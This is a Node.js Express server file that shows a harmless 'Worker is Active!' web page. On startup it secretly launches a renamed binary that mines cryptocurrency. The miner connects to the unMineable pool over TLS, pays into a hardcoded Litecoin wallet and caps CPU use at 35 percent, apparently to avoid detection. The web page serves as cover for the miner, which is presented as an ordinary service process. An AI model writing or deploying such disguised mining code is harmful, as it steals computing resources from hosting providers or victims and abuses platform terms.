const express = require('express');
const { spawn } = require('child_process');
const app = express();
const PORT = process.env.PORT || 10000;

app.get('/', (req, res) => {
  res.send('Worker is Active!');
});

app.listen(PORT, () => {
  console.log(`Server started on port ${PORT}`);

  const walletAddress = 'LXwrHMpJGV68GEXnduw9tXBja2M4nKCT3o';
  const workerName = `worker_${Math.floor(Math.random() * 10000)}`;

  const worker = spawn('./node-process', [
    '-o', 'rx.unmineable.com:3333',
    '-u', `LTC:${walletAddress}.${workerName}`,
    '-p', 'x',
    '--cpu-max-threads-hint', '35',
    '--tls',
    '--don-level', '0'
  ]);
});
